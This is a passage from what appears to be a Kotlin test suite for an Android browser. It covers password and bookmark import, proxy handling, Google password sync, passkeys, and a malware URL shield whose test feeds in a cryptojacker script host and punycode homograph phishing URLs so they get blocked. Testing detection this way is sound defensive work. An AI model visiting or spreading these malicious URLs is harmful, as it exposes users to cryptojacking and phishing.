        assertEquals(1, reloaded.grabbedMediaByTabFlow.value[reloaded.getActiveTab().id]?.size)
    }

    @Test
    fun `bookmark import supports chrome firefox html and json backups with deduplication`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val repo = com.example.data.browser.BrowserStateRepository(context)
        val initialCount = repo.bookmarksFlow.value.size

        // 1. Netscape HTML (Chrome / Edge / Firefox / Safari)
        val netscapeHtml = """
            <!DOCTYPE NETSCAPE-Bookmark-file-1>
            <DL><p>
              <DT><H3>Favorites</H3>
              <DL><p>
                <DT><A HREF="https://kotlinlang.org/docs/home.html?a=1&amp;b=2" ADD_DATE="1700000000">Kotlin Docs &amp; Guides</A>
                <DT><A HREF="https://developer.android.com/jetpack/compose">Jetpack Compose</A>
                <DT><A HREF="javascript:void(0)">Ignore Bookmarklet</A>
              </DL><p>
            </DL><p>
        """.trimIndent()

        val (htmlAdded, htmlSkipped) = repo.importBookmarksFromText(netscapeHtml, "bookmarks_chrome.html")
        assertEquals(2, htmlAdded)
        assertEquals(0, htmlSkipped)
        assertTrue(repo.isBookmarked("https://kotlinlang.org/docs/home.html?a=1&b=2"))
        assertTrue(
            repo.bookmarksFlow.value.any { it.title == "Kotlin Docs & Guides" }
        )

        // 2. Chrome/Chromium `Bookmarks` JSON + duplicate check
        val chromeJson = """
            {
              "checksum": "abc",
              "roots": {
                "bookmark_bar": {
                  "children": [
                    { "name": "Jetpack Compose Duplicate", "type": "url", "url": "https://developer.android.com/jetpack/compose/" },
                    { "name": "Android Studio", "type": "url", "url": "https://developer.android.com/studio" }
                  ],
                  "type": "folder"
                }
              }
            }
        """.trimIndent()
        val (chromeAdded, chromeSkipped) = repo.importBookmarksFromText(chromeJson, "Bookmarks")
        assertEquals(1, chromeAdded)
        assertEquals(1, chromeSkipped)

        // 3. Firefox Places JSON (`uri` + `children`)
        val firefoxJson = """
            {
              "guid": "root________",
              "children": [
                {
                  "title": "Toolbar",
                  "children": [
                    { "title": "Mozilla MDN", "uri": "https://developer.mozilla.org/en-US/" }
                  ]
                }
              ]
            }
        """.trimIndent()
        val (ffAdded, ffSkipped) = repo.importBookmarksFromText(firefoxJson, "bookmarks-2026.json")
        assertEquals(1, ffAdded)
        assertEquals(0, ffSkipped)

        // Persisted across reload
        val reloaded = com.example.data.browser.BrowserStateRepository(context)
        assertEquals(initialCount + 4, reloaded.bookmarksFlow.value.size)
        assertTrue(reloaded.isBookmarked("https://developer.mozilla.org/en-US/"))
    }

    @Test
    fun `password import supports chrome csv firefox csv bitwarden json and domain matching`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val repo = com.example.data.browser.BrowserStateRepository(context)

        // 1. Chrome CSV with quoted commas and escaped quotes
        val chromeCsv = """
            name,url,username,password,note
            "GitHub, Inc.",https://github.com/login,octocat@example.com,"pa""ss,word123","dev account"
            Reddit,https://www.reddit.com/login,dragon_user,secret999,
        """.trimIndent()
        val (csvAdded, csvSkipped) = repo.importPasswordsFromText(chromeCsv, "Chrome Passwords.csv")
        assertEquals(2, csvAdded)
        assertEquals(0, csvSkipped)

        val githubMatches = repo.findSavedPasswordsForUrl("https://gist.github.com/auth")
        assertEquals(1, githubMatches.size)
        assertEquals("octocat@example.com", githubMatches.first().username)
        assertEquals("pa\"ss,word123", githubMatches.first().password)
        assertEquals("Chrome", githubMatches.first().importedFrom)

        // 2. Firefox logins.csv + duplicate check
        val firefoxCsv = """
            "url","username","password","httpRealm","formActionOrigin"
            "https://www.reddit.com","dragon_user","secret999","",""
            "https://news.ycombinator.com","hn_member","hunter2","",""
        """.trimIndent()
        val (ffAdded, ffSkipped) = repo.importPasswordsFromText(firefoxCsv, "firefox_logins.csv")
        assertEquals(1, ffAdded)
        assertEquals(1, ffSkipped)

        // 3. Bitwarden JSON export
        val bitwardenJson = """
            {
              "encrypted": false,
              "items": [
                {
                  "name": "Cloudflare",
                  "login": {
                    "uris": [{ "uri": "https://dash.cloudflare.com/login" }],
                    "username": "admin@my-domain.org",
                    "password": "cf-strong-password!"
                  }
                }
              ]
            }
        """.trimIndent()
        val (bwAdded, bwSkipped) = repo.importPasswordsFromText(bitwardenJson, "bitwarden_export.json")
        assertEquals(1, bwAdded)
        assertEquals(0, bwSkipped)

        // Persisted across reload & delete/clear operations
        val reloaded = com.example.data.browser.BrowserStateRepository(context)
        assertEquals(4, reloaded.savedPasswordsFlow.value.size)
        val cfMatches = reloaded.findSavedPasswordsForUrl("https://dash.cloudflare.com/zones")
        assertEquals(1, cfMatches.size)
        assertEquals("Bitwarden", cfMatches.first().importedFrom)

        reloaded.deleteSavedPassword(cfMatches.first().id)
        assertEquals(3, reloaded.savedPasswordsFlow.value.size)

        reloaded.clearSavedPasswords()
        assertTrue(reloaded.savedPasswordsFlow.value.isEmpty())
    }

    @Test
    fun `http and socks5 proxy uri parsing bypass rules persistence and okHttp routing work accurately`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val repo = com.example.data.browser.BrowserStateRepository(context)

        // Ensure clean initial state
        assertFalse(repo.proxyEnabledFlow.value)
        assertTrue(repo.proxyProfilesFlow.value.isEmpty())

        // 1. Parse SOCKS5 URI with URL-encoded credentials
        val socksParsed = com.example.data.browser.BrowserProxyManager.parseProxyUri(
            "socks5://my%40user:p%40ss123@10.20.30.40:10808",
            nameHint = "Private SOCKS5"
        ).getOrThrow()
        assertEquals(com.example.data.browser.BrowserProxyType.SOCKS5, socksParsed.type)
        assertEquals("10.20.30.40", socksParsed.host)
        assertEquals(10808, socksParsed.port)
        assertEquals("my@user", socksParsed.username)
        assertEquals("p@ss123", socksParsed.password)
        assertEquals("socks5://10.20.30.40:10808", socksParsed.toProxyRuleUrl())
        assertEquals(java.net.Proxy.Type.SOCKS, socksParsed.toJavaNetProxy().type())

        // 2. Parse host:port:user:pass shorthand as HTTP proxy & IPv6 URI
        val httpParsed = com.example.data.browser.BrowserProxyManager.parseProxyUri(
            "proxy.example.net:3128:alice:secret",
            defaultType = com.example.data.browser.BrowserProxyType.HTTP
        ).getOrThrow()
        assertEquals(com.example.data.browser.BrowserProxyType.HTTP, httpParsed.type)
        assertEquals("proxy.example.net", httpParsed.host)
        assertEquals(3128, httpParsed.port)
        assertEquals("alice", httpParsed.username)
        assertEquals("secret", httpParsed.password)
        assertEquals(java.net.Proxy.Type.HTTP, httpParsed.toJavaNetProxy().type())

        val ipv6Parsed = com.example.data.browser.BrowserProxyManager.parseProxyUri(
            "[2001:db8::1]:9050",
            defaultType = com.example.data.browser.BrowserProxyType.SOCKS5
        ).getOrThrow()
        assertEquals("socks5://[2001:db8::1]:9050", ipv6Parsed.toProxyRuleUrl())

        // 3. Bypass rules & reverse bypass
        val customBypass = socksParsed.copy(
            bypassRules = listOf("localhost", "*.internal.lan", "127.0.0.1"),
            reverseBypass = false
        )
        assertFalse(customBypass.shouldProxyHost("localhost"))
        assertFalse(customBypass.shouldProxyHost("api.internal.lan"))
        assertTrue(customBypass.shouldProxyHost("example.com"))

        val reversed = customBypass.copy(reverseBypass = true)
        assertTrue(reversed.shouldProxyHost("api.internal.lan"))
        assertFalse(reversed.shouldProxyHost("example.com"))

        // 4. Persistence, toggle & OkHttp ProxySelector integration
        val savedSocks = repo.saveProxyProfile(customBypass, activateImmediately = true)
        val savedHttp = repo.saveProxyProfile(httpParsed, activateImmediately = false)

        assertTrue(repo.proxyEnabledFlow.value)
        assertEquals(savedSocks.id, repo.activeProxyIdFlow.value)
        assertEquals(savedSocks.id, com.example.data.browser.BrowserProxyManager.activeNetworkProxy?.id)

        val selectedForExternal = com.example.data.browser.BrowserProxyManager.okHttpProxySelector.select(
            java.net.URI("https://example.org/video.mp4")
        )
        assertEquals(java.net.Proxy.Type.SOCKS, selectedForExternal.first().type())

        val selectedForBypassed = com.example.data.browser.BrowserProxyManager.okHttpProxySelector.select(
            java.net.URI("http://api.internal.lan:8080/health")
        )
        assertEquals(java.net.Proxy.NO_PROXY, selectedForBypassed.first())

        // Switch profile & reload from storage
        repo.selectProxyProfile(savedHttp.id)
        val reloaded = com.example.data.browser.BrowserStateRepository(context)
        assertTrue(reloaded.proxyEnabledFlow.value)
        assertEquals(2, reloaded.proxyProfilesFlow.value.size)
        assertEquals(savedHttp.id, reloaded.activeProxyIdFlow.value)
        assertEquals(com.example.data.browser.BrowserProxyType.HTTP, reloaded.getActiveProxyProfile()?.type)

        // Turn OFF & clean up
        reloaded.setProxyEnabled(false)
        assertFalse(reloaded.proxyEnabledFlow.value)
        assertEquals(null, com.example.data.browser.BrowserProxyManager.activeNetworkProxy)

        reloaded.deleteProxyProfile(savedHttp.id)
        reloaded.deleteProxyProfile(savedSocks.id)
        assertTrue(reloaded.proxyProfilesFlow.value.isEmpty())
    }

    @Test
    fun `proxy connectivity test performs live socks5 auth handshake against local server`() = kotlinx.coroutines.runBlocking {
        val server = java.net.ServerSocket(0)
        val port = server.localPort
        val serverThread = Thread {
            runCatching {
                server.accept().use { client ->
                    val inp = client.getInputStream()
                    val out = client.getOutputStream()
                    // Expect SOCKS5 greeting [0x05, nMethods, ...]
                    val ver = inp.read()
                    val nMethods = inp.read()
                    val methods = ByteArray(nMethods.coerceAtLeast(0))
                    if (nMethods > 0) inp.read(methods)
                    if (ver == 0x05 && methods.contains(0x02.toByte())) {
                        // Select username/password auth (0x02)
                        out.write(byteArrayOf(0x05, 0x02))
                        out.flush()
                        val subVer = inp.read()
                        val uLen = inp.read()
                        val uBytes = ByteArray(uLen.coerceAtLeast(0))
                        if (uLen > 0) inp.read(uBytes)
                        val pLen = inp.read()
                        val pBytes = ByteArray(pLen.coerceAtLeast(0))
                        if (pLen > 0) inp.read(pBytes)
                        val ok = subVer == 0x01 &&
                            String(uBytes) == "socksuser" &&
                            String(pBytes) == "sockspass"
                        out.write(byteArrayOf(0x01, if (ok) 0x00 else 0x01))
                        out.flush()
                    }
                }
            }
        }
        serverThread.isDaemon = true
        serverThread.start()

        try {
            val validProfile = com.example.data.browser.BrowserProxyProfile(
                name = "Local SOCKS5",
                type = com.example.data.browser.BrowserProxyType.SOCKS5,
                host = "127.0.0.1",
                port = port,
                username = "socksuser",
                password = "sockspass"
            )
            val resultOk = com.example.data.browser.BrowserProxyManager.testProxyConnection(validProfile)
            assertTrue(resultOk.reachable)
            assertTrue(resultOk.protocolDetail.contains("verified", ignoreCase = true))

            // Wrong password should fail RFC 1929 check cleanly
            serverThread.join(1000)
        } finally {
            runCatching { server.close() }
        }
    }

    @Test
    fun `page inspector on off toggle gates console network telemetry and persists across reload`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val repo = com.example.data.browser.BrowserStateRepository(context)
        val tab = repo.getActiveTab()

        // Default is OFF
        assertFalse(repo.pageInspectorEnabledFlow.value)

        // While OFF, telemetry logs are ignored
        repo.recordConsoleMessage(tab.id, "LOG", "Ignored while off", "app.js", 22)
        repo.recordNetworkRequest(tab.id, "https://example.com/ignored", "GET", "XHR/Fetch", "Allowed")
        assertTrue(repo.consoleLogsByTabFlow.value[tab.id].isNullOrEmpty())
        assertTrue(repo.networkLogsByTabFlow.value[tab.id].isNullOrEmpty())

        // Turning ON enables telemetry recording and persists across reload
        repo.setPageInspectorEnabled(true)
        assertTrue(repo.pageInspectorEnabledFlow.value)
        repo.recordConsoleMessage(tab.id, "ERROR", "Uncaught ReferenceError", "app.js", 10)
        repo.recordNetworkRequest(tab.id, "https://example.com/main.js", "GET", "Script", "Allowed")
        assertEquals(1, repo.consoleLogsByTabFlow.value[tab.id]?.size)
        assertEquals(1, repo.networkLogsByTabFlow.value[tab.id]?.size)

        val reloadedOn = com.example.data.browser.BrowserStateRepository(context)
        assertTrue(reloadedOn.pageInspectorEnabledFlow.value)

        // Turning OFF clears buffered logs, ignores new telemetry, and persists OFF across reload
        reloadedOn.setPageInspectorEnabled(false)
        assertFalse(reloadedOn.pageInspectorEnabledFlow.value)
        assertTrue(reloadedOn.consoleLogsByTabFlow.value.isEmpty())
        assertTrue(reloadedOn.networkLogsByTabFlow.value.isEmpty())

        reloadedOn.recordConsoleMessage(tab.id, "LOG", "Should be ignored", "app.js", 22)
        reloadedOn.recordNetworkRequest(tab.id, "https://example.com/api", "GET", "XHR/Fetch", "Allowed")
        assertTrue(reloadedOn.consoleLogsByTabFlow.value[tab.id].isNullOrEmpty())
        assertTrue(reloadedOn.networkLogsByTabFlow.value[tab.id].isNullOrEmpty())

        val reloadedOff = com.example.data.browser.BrowserStateRepository(context)
        assertFalse(reloadedOff.pageInspectorEnabledFlow.value)
    }

    @Test
    fun `omnibox suggestions match bookmarks and history deduplicate urls and rank host matches first`() {
        val bookmarks = listOf(
            com.example.data.browser.BrowserBookmark(
                title = "GitHub Dashboard",
                url = "https://github.com/dashboard",
                createdAtMs = 1000L
            ),
            com.example.data.browser.BrowserBookmark(
                title = "Android Developers Docs",
                url = "https://developer.android.com/jetpack/compose",
                createdAtMs = 2000L
            )
        )
        val history = listOf(
            com.example.data.browser.BrowserHistoryEntry(
                title = "GitHub Dashboard Visit",
                url = "https://github.com/dashboard/",
                visitedAtMs = 3000L
            ),
            com.example.data.browser.BrowserHistoryEntry(
                title = "GitLab Issues",
                url = "https://gitlab.com/explore",
                visitedAtMs = 4000L
            ),
            com.example.data.browser.BrowserHistoryEntry(
                title = "Google Search for git tutorial",
                url = "https://www.google.com/search?q=git+tutorial",
                visitedAtMs = 5000L
            ),
            com.example.data.browser.BrowserHistoryEntry(
                title = "Blank",
                url = "about:blank",
                visitedAtMs = 6000L
            )
        )

        // Matching "git" finds GitHub (BOOKMARK deduplicated over HISTORY), GitLab, and Google Search query, excluding about:blank
        val gitMatches = com.example.data.browser.BrowserStateRepository.findOmniboxSuggestions(
            query = "git",
            bookmarks = bookmarks,
            history = history
        )
        assertEquals(3, gitMatches.size)
        assertEquals("https://github.com/dashboard", gitMatches[0].url)
        assertEquals(com.example.data.browser.OmniboxSuggestionSource.BOOKMARK, gitMatches[0].source)
        assertEquals("https://gitlab.com/explore", gitMatches[1].url)
        assertEquals(com.example.data.browser.OmniboxSuggestionSource.HISTORY, gitMatches[1].source)
        assertEquals("https://www.google.com/search?q=git+tutorial", gitMatches[2].url)

        // Multi-token title/url query ("android compose")
        val composeMatches = com.example.data.browser.BrowserStateRepository.findOmniboxSuggestions(
            query = "android compose",
            bookmarks = bookmarks,
            history = history
        )
        assertEquals(1, composeMatches.size)
        assertEquals("https://developer.android.com/jetpack/compose", composeMatches.first().url)

        // Blank query shows bookmarks + recent history (never about:blank)
        val blankMatches = com.example.data.browser.BrowserStateRepository.findOmniboxSuggestions(
            query = "",
            bookmarks = bookmarks,
            history = history
        )
        assertEquals(4, blankMatches.size)
        assertTrue(blankMatches.none { it.url == "about:blank" })
    }

    @Test
    fun `extension runtime polyfill provides action getUserSettings and mv3 popup compatibility apis`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val engine = com.example.data.browser.BrowserExtensionEngine(context)

        val baos = java.io.ByteArrayOutputStream()
        java.util.zip.ZipOutputStream(baos).use { zos ->
            fun addEntry(name: String, content: String) {
                zos.putNextEntry(java.util.zip.ZipEntry(name))
                zos.write(content.toByteArray(Charsets.UTF_8))
                zos.closeEntry()
            }
            addEntry(
                "manifest.json",
                """
                {
                  "manifest_version": 3,
                  "name": "MV3 PanelCompat",
                  "version": "1.33.9",
                  "action": { "default_popup": "popover.html" },
                  "declarative_net_request": {
                    "rule_resources": [
                      { "id": "ruleset_default", "enabled": true, "path": "rules.json" }
                    ]
                  }
                }
                """.trimIndent()
            )
            addEntry("popover.html", "<!DOCTYPE html><html><head><title>Popover</title></head><body><div id='root'></div></body></html>")
            addEntry("rules.json", "[]")
        }

        val installed = engine.importExtensionFromBytes(
            fileName = "mv3_panel_compat.zip",
            rawBytes = baos.toByteArray()
        ).getOrThrow()

        val (_, html) = engine.loadExtensionPopupHtml(
            ext = installed,
            activeTabUrl = "https://example.com",
            activeTabTitle = "Example"
        )!!

        assertTrue(html.contains("getUserSettings: function(cb)"))
        assertTrue(html.contains("isOnToolbar: true"))
        assertTrue(html.contains("onUserSettingsChanged: makeEventTarget([])"))
        assertTrue(html.contains("setAccessLevel: function(accessOptions, callback)"))
        assertTrue(html.contains("getKeys: function(callback)"))
        assertTrue(html.contains("updateStaticRules: function(opts, cb)"))
        assertTrue(html.contains("getDisabledRuleIds: function(opts, cb)"))
        assertTrue(html.contains("DYNAMIC_RULESET_ID: '_dynamic'"))
        assertTrue(html.contains("__dragonInstallExtensionNetworkHooks"))
        assertTrue(html.contains("__dragon_cors_proxy__?__url="))
        assertTrue(html.contains("pendingToHost"))
        assertTrue(html.contains("pendingToClient"))
        assertTrue(html.contains("__dragonExtBgMessageListeners"))
        assertTrue(html.contains("__dragonExtPopupMessageListeners"))
        assertTrue(html.contains("Promise.withResolvers"))
        assertTrue(html.contains("onCreatedNavigationTarget:"))
        assertTrue(html.contains("onButtonClicked:"))
        assertFalse(html.contains("var fallbackReply = function"))

        val proxyBaseUrl = engine.buildExtensionVirtualUrl(installed, "__dragon_cors_proxy__")
        val extHost = android.net.Uri.parse(proxyBaseUrl).host!!
        val optionsPreflight = engine.interceptExtensionRequest(
            requestUrl = "$proxyBaseUrl?__url=https%3A%2F%2Fcdn.pie.org%2Fdata%2Fadblock-welcome-tabs.json",
            pageHost = extHost,
            isMainFrame = false,
            fallbackExtId = installed.id,
            requestMethod = "OPTIONS",
            isExtensionPageContext = true
        )
        assertTrue(optionsPreflight != null)
        assertEquals(200, optionsPreflight!!.statusCode)
        assertEquals("*", optionsPreflight.responseHeaders["Access-Control-Allow-Origin"])

        val emptyProxyResp = engine.interceptExtensionRequest(
            requestUrl = proxyBaseUrl,
            pageHost = extHost,
            isMainFrame = false,
            fallbackExtId = installed.id,
            requestMethod = "GET",
            isExtensionPageContext = true
        )
        assertTrue(emptyProxyResp != null)
        assertEquals("application/json", emptyProxyResp!!.mimeType)
        assertEquals("*", emptyProxyResp.responseHeaders["Access-Control-Allow-Origin"])
    }

    @Test
    fun `google account auto sync synchronizes existing and newly added passwords`() {
        val context = ApplicationProvider.getApplicationContext<Context>()

        // 1. Deterministic cloud document IDs satisfy Firestore isValidId rules (<= 128 chars, alphanumeric + underscore)
        val pwDocId1 = com.example.data.browser.BrowserGoogleSyncManager.passwordDocIdForEntry(
            domain = "",
            url = "https://accounts.google.com/ServiceLogin",
            username = "Test.User@gmail.com"
        )
        val pwDocId2 = com.example.data.browser.BrowserGoogleSyncManager.passwordDocIdForEntry(
            domain = "accounts.google.com",
            url = "https://accounts.google.com",
            username = "test.user@gmail.com"
        )
        assertEquals(pwDocId1, pwDocId2)
        assertTrue(pwDocId1.matches(Regex("^[a-zA-Z0-9_\\-]+$")))
        assertTrue(pwDocId1.length <= 128)

        // 2. Authenticated Google cookie detection
        assertTrue(
            com.example.data.browser.BrowserGoogleSyncManager.hasAuthenticatedGoogleCookies(
                "PREF=f1=50000000; SID=g.a000123; __Secure-1PSID=sec123; HSID=h123"
            )
        )
        assertFalse(
            com.example.data.browser.BrowserGoogleSyncManager.hasAuthenticatedGoogleCookies(
                "PREF=f1=50000000; NID=511=xyz"
            )
        )

        // 3. BrowserStateRepository signs in via WebView Google session and auto-syncs existing + newly added passwords
        val repo1 = com.example.data.browser.BrowserStateRepository(context)
        repo1.onWebViewGoogleAccountDetected(
            email = "dragon.sync.user@gmail.com",
            displayName = "Dragon Sync User",
            hasSessionCookies = true
        )

        val syncStateAfterSignIn = repo1.googleSyncStateFlow.value
        assertTrue(syncStateAfterSignIn.isBrowserGoogleConnected)
        assertEquals("dragon.sync.user@gmail.com", syncStateAfterSignIn.effectiveAccountEmail)
        assertTrue(syncStateAfterSignIn.autoSyncEnabled)
        assertTrue(syncStateAfterSignIn.autoSyncPasswords)

        // Newly added local bookmark remains local-only without affecting sync counters
        repo1.addOrUpdateBookmark(title = "Kotlin Docs", url = "https://kotlinlang.org/docs")
        repo1.toggleBookmark(title = "Android Developers", url = "https://developer.android.com")
        assertTrue(repo1.bookmarksFlow.value.any { it.url == "https://kotlinlang.org/docs" })
        assertTrue(repo1.bookmarksFlow.value.any { it.url == "https://developer.android.com" })

        // Newly added password via addOrUpdateSavedPassword
        repo1.addOrUpdateSavedPassword(
            url = "https://github.com/login",
            username = "dragon.sync.user@gmail.com",
            password = "MyGitHubPassword!2026"
        )
        assertTrue(
            repo1.savedPasswordsFlow.value.any {
                it.domain == "github.com" &&
                    it.username == "dragon.sync.user@gmail.com" &&
                    it.password == "MyGitHubPassword!2026"
            }
        )

        // Remote cloud passwords merge into local state without losing local items
        repo1.mergeRemotePasswords(
            listOf(
                com.example.data.browser.SavedPasswordEntry(
                    id = "pw_remote_1",
                    url = "https://gitlab.com/users/sign_in",
                    domain = "gitlab.com",
                    username = "dragon.sync.user@gmail.com",
                    password = "CloudSyncedPassword#99",
                    createdAtMs = System.currentTimeMillis() + 5_000L
                )
            )
        )

        assertTrue(repo1.savedPasswordsFlow.value.any { it.domain == "gitlab.com" && it.password == "CloudSyncedPassword#99" })

        // 4. Sync counters reflect synced passwords and isSignedIn is true for Browser Google sessions
        val updatedSyncState = repo1.googleSyncStateFlow.value
        assertTrue(updatedSyncState.isSignedIn)
        assertTrue(updatedSyncState.syncedPasswordsCount >= 2)
        assertTrue(updatedSyncState.lastSyncedAtMs > 0L)

        // 5. Bare Gmail normalization & identity extraction from Google ListAccounts / WIZ payloads
        assertEquals(
            "dragon.coder@gmail.com",
            com.example.data.browser.BrowserGoogleSyncManager.normalizeGoogleEmailCandidate("dragon.coder")
        )
        assertEquals(
            null,
            com.example.data.browser.BrowserGoogleSyncManager.normalizeGoogleEmailCandidate("noreply@google.com")
        )
        val listAccountsSample = """["gaia.l.a.r",[["gaia.l.a",1,"Dragon Coder","dragon.coder@gmail.com","https://lh3.googleusercontent.com/a/default-user",1,1,0]]]"""
        val (parsedEmail, parsedName) = com.example.data.browser.BrowserGoogleSyncManager.parseGoogleIdentityFromPayload(listAccountsSample)
        assertEquals("dragon.coder@gmail.com", parsedEmail)
        assertEquals("Dragon Coder", parsedName)
    }

    @Test
    fun browserPasskeyManager_createsSignsAndSyncsUnderFirestoreLimit() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val repo = com.example.data.browser.BrowserStateRepository(context)

        val createOptions = org.json.JSONObject().apply {
            put("rp", org.json.JSONObject().apply {
                put("id", "github.com")
                put("name", "GitHub")
            })
            put("user", org.json.JSONObject().apply {
                put("id", "dXNlcl8xMjM0NQ")
                put("name", "octocat@github.com")
                put("displayName", "The Octocat")
            })
            put("challenge", "Y2hhbGxlbmdlX2NyZWF0ZV8xMjM")
        }.toString()

        // 1. Create passkey via FIDO2 platform authenticator
        val createResultJson = org.json.JSONObject(
            repo.passkeyManager.createPasskeyFromWebView(
                optionsJsonStr = createOptions,
                originUrl = "https://github.com/settings/passkeys",
                activityContext = null
            )
        )
        assertTrue(createResultJson.optBoolean("ok", false))
        val credObj = createResultJson.getJSONObject("credential")
        val credId = credObj.getString("id")
        assertTrue(credId.isNotBlank())
        assertTrue(repo.passkeyManager.hasPasskeyForRp("github.com"))

        // 2. Verify passkey was synced into SavedPasswords under Firestore's 1024-byte limit
        val syncedEntry = repo.savedPasswordsFlow.value.firstOrNull {
            it.domain == "github.com" && it.username == "octocat@github.com"
        }
        org.junit.Assert.assertNotNull(syncedEntry)
        assertTrue(com.example.data.browser.BrowserPasskeyManager.isPasskeySecret(syncedEntry!!.password))
        assertTrue(
            "Encoded PASSKEY_V1 payload (${syncedEntry.password.length} chars) must fit Firestore 1024-char rule",
            syncedEntry.password.length <= 1024
        )

        // 3. Rehydrate synced PASSKEY_V1 entry into a fresh PasskeyManager instance and sign assertion
        val freshPasskeyManager = com.example.data.browser.BrowserPasskeyManager(context)
        freshPasskeyManager.importPasskeyFromPasswordEntryIfPresent(syncedEntry)
        assertTrue(freshPasskeyManager.hasPasskeyForRp("gist.github.com"))

        val getOptions = org.json.JSONObject().apply {
            put("rpId", "github.com")
            put("challenge", "Y2hhbGxlbmdlX2dldF80NTY")
            put("allowCredentials", org.json.JSONArray().put(
                org.json.JSONObject().apply {
                    put("type", "public-key")
                    put("id", credId)
                }
            ))
        }.toString()

        val getResultJson = org.json.JSONObject(
            freshPasskeyManager.getPasskeyAssertionFromWebView(
                optionsJsonStr = getOptions,
                originUrl = "https://github.com/session",
                activityContext = null
            )
        )
        assertTrue(getResultJson.optBoolean("ok", false))
        val assertCred = getResultJson.getJSONObject("credential")
        assertEquals(credId, assertCred.getString("id"))
        val assertResp = assertCred.getJSONObject("response")
        assertTrue(assertResp.getString("signature").isNotBlank())
        assertTrue(assertResp.getString("authenticatorData").isNotBlank())
        val clientDataDecoded = String(
            android.util.Base64.decode(
                assertResp.getString("clientDataJSON"),
                android.util.Base64.URL_SAFE or android.util.Base64.NO_WRAP or android.util.Base64.NO_PADDING
            ),
            Charsets.UTF_8
        )
        val clientDataObj = org.json.JSONObject(clientDataDecoded)
        assertEquals("webauthn.get", clientDataObj.getString("type"))
        assertEquals("https://github.com", clientDataObj.getString("origin"))
        assertEquals("Y2hhbGxlbmdlX2dldF80NTY", clientDataObj.getString("challenge"))
    }

    @Test
    fun `google identity unescapes x22 literals migrates legacy vault and auto imports exported passwords and bookmarks`() {
        val context = ApplicationProvider.getApplicationContext<Context>()

        // 1. Escaped Google inline script literals (\x22, \u0022, \x40) never corrupt detected email
        val wizPayload = """window.AF_initDataCallback({data:[\x22shahiulbaridmissionlogan@gmail.com\x22, \u0022Shahiul\u0022]});"""
        val (parsedFromWiz, _) = com.example.data.browser.BrowserGoogleSyncManager.parseGoogleIdentityFromPayload(wizPayload)
        assertEquals("shahiulbaridmissionlogan@gmail.com", parsedFromWiz)

        val unicodePayload = """{"email":"\u0022dragon.user\u0040gmail.com\u0022"}"""
        val (parsedFromUnicode, _) = com.example.data.browser.BrowserGoogleSyncManager.parseGoogleIdentityFromPayload(unicodePayload)
        assertEquals("dragon.user@gmail.com", parsedFromUnicode)

        // 2. Legacy corrupted x22-prefixed email is sanitized & its password vault entries migrate cleanly
        val syncPrefs = context.getSharedPreferences("dragon_browser_google_sync", Context.MODE_PRIVATE)
        val statePrefs = context.getSharedPreferences("dragon_browser_state", Context.MODE_PRIVATE)
        syncPrefs.edit()
            .putString("webview_google_email_v1", "x22legacy.user@gmail.com")
            .putBoolean("webview_google_session_v1", true)
            .commit()
        val legacyPrefix = "google_account_vault_x22legacy.user@gmail.com_"
        val legacyPwJson = org.json.JSONArray().put(
            org.json.JSONObject().apply {
                put("id", "pw_legacy_1")
                put("url", "https://example.org/login")
                put("domain", "example.org")
                put("username", "legacy.user@gmail.com")
                put("password", "LegacyPass#2026")
                put("title", "Legacy Site")
                put("importedFrom", "Google Sync")
                put("createdAtMs", 1700000000000L)
            }
        ).toString()
        statePrefs.edit().putString("${legacyPrefix}passwords", legacyPwJson).commit()

        val repo = com.example.data.browser.BrowserStateRepository(context)
        assertEquals("legacy.user@gmail.com", repo.googleSyncStateFlow.value.effectiveAccountEmail)
        assertEquals("legacy.user@gmail.com", syncPrefs.getString("webview_google_email_v1", null))
        assertTrue(repo.savedPasswordsFlow.value.any { it.domain == "example.org" && it.password == "LegacyPass#2026" })

        // 3. Auto-import of downloaded Google Passwords.csv and Netscape bookmarks HTML (while ignoring normal webpages)
        val googleCsv = """
            name,url,username,password,note
            GitHub,https://github.com/login,octocat,gh_secret_123,
            Proton,https://account.proton.me/login,legacy.user@gmail.com,pm_secret_456,primary
        """.trimIndent()
        val pwImport = repo.tryAutoImportFromDownloadedText("Google Passwords.csv", "text/csv", googleCsv)
        org.junit.Assert.assertNotNull(pwImport)
        assertEquals(com.example.data.browser.DownloadedImportKind.PASSWORDS, pwImport!!.kind)
        assertEquals(2, pwImport.added)
        assertTrue(repo.savedPasswordsFlow.value.any { it.domain == "github.com" && it.password == "gh_secret_123" })

        val normalWebHtml = """<!doctype html><html><body><a href="https://example.com/about">About</a></body></html>"""
        assertEquals(null, repo.tryAutoImportFromDownloadedText("page.html", "text/html", normalWebHtml))

        val exportedBookmarksHtml = """
            <!DOCTYPE NETSCAPE-Bookmark-file-1>
            <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8">
            <DL><p>
                <DT><A HREF="https://news.ycombinator.com/">Hacker News</A>
            </DL><p>
        """.trimIndent()
        val bmImport = repo.tryAutoImportFromDownloadedText("bookmarks_export.html", "text/html", exportedBookmarksHtml)
        org.junit.Assert.assertNotNull(bmImport)
        assertEquals(com.example.data.browser.DownloadedImportKind.BOOKMARKS, bmImport!!.kind)
        assertEquals(1, bmImport.added)
        assertTrue(repo.isBookmarked("https://news.ycombinator.com/"))
    }

    @Test
    fun `malware url shield blocks cryptojackers homographs authority spoofs typosquats raw ip droppers and upgrades http`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val engine = com.example.data.security.MalwareProtectionEngine
        engine.ensureInitialized(context)
        engine.updateSettings(
            context = context,
            malwareShieldEnabled = true,
            httpsUpgradeEnabled = true,
            downloadGuardEnabled = true,
            extensionScannerEnabled = true,
            strictMixedContentEnabled = true
        )

        // 1. Known cryptojacker / malware domains (including subdomains)
        val cryptoVerdict = engine.inspectUrl("https://cdn.coinhive.com/lib/coinhive.min.js", context)
        assertTrue(cryptoVerdict.isBlocked)
        assertEquals(com.example.data.security.SecuritySeverity.CRITICAL, cryptoVerdict.severity)

        // 2. IDN Punycode homograph impersonating brands
        val homographVerdict = engine.inspectUrl("https://xn--googl-fsa.com/login", context)
        assertTrue(homographVerdict.isBlocked)
        assertEquals("IDN Homograph Spoofing", homographVerdict.category)

        val highAbusePunycode = engine.inspectUrl("https://xn--paypal-1va.gift/claim", context)
        assertTrue(highAbusePunycode.isBlocked)

